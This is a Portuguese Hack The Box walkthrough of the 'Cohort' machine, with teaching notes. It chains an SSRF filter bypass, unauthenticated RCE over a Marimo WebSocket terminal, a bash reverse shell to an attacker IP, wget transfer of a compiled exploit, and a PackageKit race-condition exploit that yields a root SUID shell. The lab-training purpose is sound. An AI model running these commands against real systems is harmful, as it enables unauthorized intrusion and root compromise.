# Writeup — Hack The Box: Cohort

**Sistema:** Linux (Ubuntu)

## Sumário

| Etapa | Técnica |
|---|---|
| Reconhecimento | Nmap, análise do certificado wildcard |
| Acesso inicial | SSRF em `/api/validate` (bypass de filtro de loopback) |
| Descoberta interna | Vazamento do vhost do Marimo via SSRF em `/status` |
| Flag de usuário | RCE via WebSocket sem autenticação (CVE-2026-39987) |
| Escalada de privilégio | Race condition (TOCTOU) no PackageKit (CVE-2026-41651) |
| Bandeira de raiz | SUID bash gerado pela race condition |

## Como ler este texto

Cada bloco de comando tem uma etiqueta inferior onde deve ser executado:

- 🖥️ **ATACANTE (Kali)** — rodou no seu terminal Kali/pwnbox, fora da máquina alvo.
- 🎯 **VÍTIMA — shell marimo** — rodou dentro da shell reversa obtida na Fase 3.
- 📖 **APENAS LEITURA (comportamento observado)** — resposta do servidor mostrada só para entendimento, não é algo que se "executa".

---

## 1. Reconhecimento

### 1.1 Varredura de portas com Nmap

🖥️ ATACANTE (Kali):

```bash
nmap -sVC -T4 -p- 10.129.3.9
```

Resultado:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
|_http-title: Cohort Analytics
```

Portas relevantes:

- **22** — SSH (não utilizado no caminho de exploração)
- **80/443** — nginx, com certificado **wildcard** `*.cohort.htb`

💡 **Nota didática:** um certificado wildcard (`*.cohort.htb`) é sempre um sinal de que existem subdomínios/vhosts além do principal — muitas vezes não documentados publicamente, mas resolvidos internamente pelo próprio servidor. Vale a pena investigar.

### 1.2 Preparando o `/etc/hosts`

🖥️ ATACANTE (Kali):

```bash
echo "10.129.3.9 cohort.htb" | sudo tee -a /etc/hosts
```

---

## 2. Enumeração web

### 2.1 Descobrindo o comportamento da SPA

🖥️ ATACANTE (Kali) — primeira tentativa:

```bash
gobuster dir -u https://cohort.htb -w /usr/share/wordlists/dirb/common.txt
```

```
error on running gobuster on https://cohort.htb/: unable to connect: 
tls: failed to verify certificate: x509: certificate signed by unknown authority
```

O certificado é autoassinado — usamos `-k` pra ignorar a validação:

```bash
gobuster dir -u https://cohort.htb -w /usr/share/wordlists/dirb/common.txt -k
```

Nessa tentativa, o gobuster reporta um aviso de wildcard: a aplicação é uma **SPA** (Single Page Application) que devolve **200 OK** com o mesmo HTML de "loading" (tamanho fixo, 908 bytes) para qualquer rota inexistente. Sem tratar isso, praticamente toda palavra do wordlist vira "hit".

🖥️ ATACANTE (Kali) — filtrando o ruído:

```bash
gobuster dir -u https://cohort.htb -w /usr/share/wordlists/dirb/common.txt -k --exclude-length 908
```

Resultado:

```
api                  (Status: 301) [Size: 178] [--> https://cohort.htb/api/]
assets               (Status: 301) [Size: 178] [--> https://cohort.htb/assets/]
status               (Status: 403) [Size: 162]
```

### 2.2 Enumerando dentro de `/api/`

🖥️ ATACANTE (Kali):

```bash
gobuster dir -u https://cohort.htb/api -w /usr/share/wordlists/dirb/common.txt -k
```

```
2026/08/02 15:02:48 the server returns a status code that matches the provided 
options for non existing urls. https://cohort.htb/api/<random> => 405 (Length: 47). 
Please exclude the response length or the status code..
```

De novo há um catch-all — dessa vez respondendo **405** com 47 bytes pra qualquer rota inexistente dentro de `/api/`. Excluímos:

```bash
gobuster dir -u https://cohort.htb/api -w /usr/share/wordlists/dirb/common.txt -k --exclude-length 47
```

Resultado:

```
health               (Status: 200) [Size: 42]
```

🖥️ ATACANTE (Kali):

```bash
curl -k https://cohort.htb/api/health
```

```json
{"ok": true, "service": "cohort-insights"}
```

Confirma o nome do serviço (`cohort-insights`), mas nenhuma informação crítica ainda.

💡 **Nota didática:** sempre que o gobuster reclamar de "wildcard response" (ou você perceber muitos hits com o mesmo tamanho de resposta), é sinal de uma rota catch-all — trate com `--exclude-length`.

---

## 3. Acesso Inicial — SSRF → RCE via WebSocket

### 3.1 Encontrando e confirmando o SSRF

O gobuster com wordlist genérica não descobre rotas de ação específicas da aplicação (verbos como `/validate`). Testamos manualmente o endpoint `/api/validate`, visto na interface "Client Insights" do frontend:

🖥️ ATACANTE (Kali):

```bash
curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1"}'
```

```json
{"ok": false, "message": "Internal or loopback addresses are not permitted."}
```

O endpoint existe, aceita uma URL e claramente **faz uma requisição HTTP a partir do servidor** (por isso tenta bloquear loopback) — é um **SSRF** (Server-Side Request Forgery) clássico.

### 3.2 Bypass do filtro de loopback

📖 **APENAS LEITURA (comportamento observado):** o filtro bloqueia a string exata `127.0.0.1`, mas não trata variações que resolvem para o mesmo endereço.

🖥️ ATACANTE (Kali):

```bash
curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{"url":"http://0.0.0.0"}'
curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{"url":"http://127.1"}'
curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{"url":"http://127%2E0%2E0%2E1"}'
```

Resultado (idêntico para os três):

```json
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>...<title>Cohort Analytics</title>...", "message": "Source reachable."}
```

Todos retornaram **200 OK** com o HTML da própria aplicação — o filtro só compara a string literal, sem normalizar o endereço antes.

💡 **Nota didática:** filtros de SSRF que comparam string exata (em vez de resolver o endereço real) são facilmente contornáveis com formas alternativas de escrever o mesmo host — `0.0.0.0`, notação abreviada (`127.1`), ou codificação de URL.

### 3.3 Vazando o vhost interno via SSRF

O path `/status`, que retornou 403 direto (só acessível de dentro da máquina), agora pode ser lido através do próprio SSRF:

🖥️ ATACANTE (Kali):

```bash
curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0/status"}'
```

Resultado — um JSON com os *upstreams* configurados no nginx:

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {"name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort"},
    {"name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000"},
    {"name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888", "note": "internal analyst workspace, not for external use"}
  ]
}
```

Achamos um vhost interno (`nb-1be3782a8afd3ad5.cohort.htb`) rodando algo em `127.0.0.1:8888` — um "workspace de analista" não exposto via DNS público.

🖥️ ATACANTE (Kali) — adicionando o vhost:

```bash
echo "10.129.3.9 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

### 3.4 Identificando o serviço (Marimo) e o endpoint sem autenticação

🖥️ ATACANTE (Kali):

```bash
curl -k -I https://nb-1be3782a8afd3ad5.cohort.htb/
```

```
HTTP/1.1 303 See Other
location: https://nb-1be3782a8afd3ad5.cohort.htb/auth/login?next=...
```

A interface principal redireciona pra login. Porém o serviço é o **Marimo** (notebook Python interativo, similar ao Jupyter), afetado por:

> **CVE-2026-39987** — o endpoint `/terminal/ws` do Marimo é um WebSocket conectado direto a um PTY (pseudo-terminal) do servidor, **sem exigir autenticação**, mesmo com o resto da aplicação protegido por login.

🖥️ ATACANTE (Kali) — testando a conexão:

```bash
websocat -k wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

📖 APENAS LEITURA (comportamento observado) — dentro da sessão, digitando `whoami` e apertando Enter:

```
marimo@cohort:~$ whoami
marimo
```

RCE confirmado como usuário `marimo`.

### 3.5 Estabilizando o shell

A conexão via `websocat` é instável (sem controle de job, sem PTY completo). Usamos essa sessão como trampolim pra abrir uma reverse shell de verdade.

🖥️ ATACANTE (Kali) — listener, antes de disparar:

```bash
nc -lvnp 4444
```

🎯 VÍTIMA — shell marimo (dentro da sessão websocat) — dispara a reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1'
```

🎯 VÍTIMA — shell marimo (agora no nc) — upgrade de TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

⚠️ **Ponto de atenção prático:** se o terminal não deixar colar comandos (aparece lixo tipo `^[[200~`), é o modo *bracketed paste* que não foi interpretado corretamente pela pty. Use **Ctrl+U** pra limpar a linha (não mata o processo como Ctrl+C poderia) e digite manualmente.

### 3.6 Flag de usuário

🎯 VÍTIMA — shell marimo:

```bash
cat ~/user.txt
```

*(flag omitida de propósito — rode o comando você mesmo para ver o resultado)*

---

## 4. Escalando de `marimo` para `root` — PackageKit TOCTOU

### 4.1 Identificando o vetor

🎯 VÍTIMA — shell marimo:

```bash
dpkg -l | grep -i packagekit
```

```
ii  gir1.2-packagekitglib-1.0       1.2.8-2ubuntu1.5   amd64  GObject introspection data for the PackageKit GLib library
ii  libpackagekit-glib2-18:amd64    1.2.8-2ubuntu1.5   amd64  Library for accessing PackageKit using GLib
hi  packagekit                     1.2.8-2ubuntu1.2   amd64  Provides a package management service
ii  packagekit-tools                1.2.8-2ubuntu1.2   amd64  Provides PackageKit command-line tools
```

O status **`hi`** (**h**old + **i**nstalled) indica que essa versão foi travada deliberadamente — sinal forte de vulnerabilidade intencional.

Pesquisando CVEs pra essa versão:

> **CVE-2026-41651** — falha **TOCTOU** (*Time-of-check to time-of-use*) no PackageKit. O serviço *verifica* um pacote antes de instalar, mas existe uma janela de tempo entre a verificação e a instalação real onde é possível trocar o arquivo por um malicioso — ganhando execução com privilégios de root através do serviço de instalação de pacotes.

💡 **Nota didática — TOCTOU:** vulnerabilidades desse tipo exploram o intervalo entre "verificar algo" e "usar o resultado dessa verificação". Se dá pra trocar o recurso nesse meio-tempo, o sistema acaba agindo sobre dados diferentes dos que validou.

### 4.2 Compilando o exploit

🖥️ ATACANTE (Kali):

```bash
git clone https://github.com/Lutfifakee-Project/CVE-2026-41651.git
cd CVE-2026-41651
sudo apt install libglib2.0-dev -y
gcc CVE-2026-41651.c -o exploit $(pkg-config --cflags --libs glib-2.0 gio-2.0)
```

💡 O PackageKit se comunica via D-Bus — por isso o exploit depende das bibliotecas `glib` (base) e `gio` (contém as chamadas de D-Bus como `g_dbus_connection_call_sync`).

### 4.3 Transferindo o binário

🖥️ ATACANTE (Kali):

```bash
python3 -m http.server 8080
```

🎯 VÍTIMA — shell marimo:

```bash
wget http://<SEU_IP>:8080/exploit -O /tmp/exploit
chmod +x /tmp/exploit
```

### 4.4 Executando

🎯 VÍTIMA — shell marimo:

```bash
/tmp/exploit
```

Resultado da execução:

```
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-11234.deb
[+] payload : /tmp/.pk-payload-11234.deb
[*] Transaction : /2_ecbdeeda
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Polling for payload (120 s max)...
[+] SUCCESS — SUID bash at t+2300ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash-5.2#
```

⚠️ **Ponto de atenção prático:** o erro `PK error 48: Failed to obtain authentication` **não é fatal** — a race condition já venceu antes desse erro aparecer, é comportamento esperado.

O exploit cria dois pacotes `.deb` (um "dummy" simulado e um "payload" real), abusando da janela de tempo entre a checagem de permissão (`SIMULATE`) e a execução real da instalação pra plantar um bash com bit **SUID** (executa como o dono do arquivo — root).

### 4.5 Flag de root

🎯 VÍTIMA — shell root (`.suid_bash`):

```bash
whoami
```

```
root
```

```bash
cat /root/root.txt
```

*(flag omitida de propósito — rode o comando você mesmo para ver o resultado)*

---

## 5. Vulnerabilidades Exploradas

| Vulnerabilidade | Onde | Impacto |
|---|---|---|
| SSRF com bypass de filtro de loopback | `/api/validate` | Vazamento de recursos internos (`/status`) |
| Falta de autenticação em endpoint específico | Marimo `/terminal/ws` | RCE remoto → shell `marimo` |
| Race condition (TOCTOU) | PackageKit (D-Bus) | SUID bash → root |

---

## 6. Linha do Tempo

```
Reconhecimento
  └─ nmap → portas 22, 80, 443 (certificado wildcard *.cohort.htb)

Enumeração web
  └─ gobuster com --exclude-length (SPA fallback + API catch-all)
  └─ /api/ , /status (403), /api/health

Acesso Inicial
  └─ /api/validate = SSRF, bypass do filtro (0.0.0.0 / 127.1 / URL-encode)
  └─ SSRF em /status → vaza vhost interno do Marimo
  └─ CVE-2026-39987: /terminal/ws sem auth → RCE como marimo
  └─ reverse shell estabilizada

Flag user.txt ✅

Escalada de Privilégio (marimo → root)
  └─ dpkg -l mostra packagekit em "hold"
  └─ CVE-2026-41651 (PackageKit TOCTOU)
  └─ SUID bash

Flag root.txt ✅
```

## 7. Lições e conceitos para levar dessa máquina

- **SSRF não é só "acessar localhost"** — é sobre abusar a posição privilegiada do servidor pra alcançar recursos que ele enxerga mas você não deveria.
- **Filtros de string exata são frágeis.** Qualquer bloqueio de endereço que não normalize/resolva o valor real pode ser contornado com representações alternativas (`0.0.0.0`, notação abreviada, encoding).
- **Um certificado wildcard é sempre uma pista.** Vale a pena procurar vhosts que não aparecem em nenhum lugar público.
- **Nem toda a aplicação está protegida igualmente.** Um único endpoint pode "esquecer" de herdar a autenticação do resto do sistema — vale testar endpoints sensíveis (WebSockets, uploads, terminais) isoladamente.
- **Pacotes com status "hold" merecem atenção.** É um sinal de que a versão foi travada por algum motivo — pesquisar CVEs pra essa versão específica costuma valer a pena.
- **Race conditions (TOCTOU) são sutis mas poderosas.** Erros durante a exploração (`PK error 48`) nem sempre significam falha — entenda o que o exploit realmente está fazendo antes de descartá-lo.

---

Máquina: HTB Cohort — artigo elaborado a partir da sessão prática de exploração.
